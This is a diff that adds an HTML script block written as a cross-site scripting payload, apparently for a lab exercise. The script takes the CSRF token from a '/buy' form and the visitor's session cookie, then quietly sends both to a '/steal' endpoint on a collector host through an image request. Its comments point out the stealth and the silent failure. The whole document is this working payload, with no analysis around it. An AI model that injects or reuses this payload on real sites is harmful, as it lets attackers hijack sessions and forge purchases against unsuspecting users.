@@ -1,0 +1,22 @@
+<script>
+  try {
+    // 1. Find the CSRF token in the "Buy Now" form
+    var token = document.querySelector('form[action="/buy"] input[name="_csrf"]').value;
+    
+    // 2. Get the user's session cookie
+    var cookie = document.cookie;
+    
+    // 3. Create the URL to send the stolen data
+    var stealURL = 'http://127.0.0.1:4000/steal?token=' 
+                   + encodeURIComponent(token) 
+                   + '&cookie=' 
+                   + encodeURIComponent(cookie);
+    
+    // 4. Silently send the data (using new Image() is stealthier)
+    new Image().src = stealURL;
+
+  } catch (e) {
+    // Fail silently if any element isn't found
+    console.error('Payload failed:', e);
+  }
+</script>
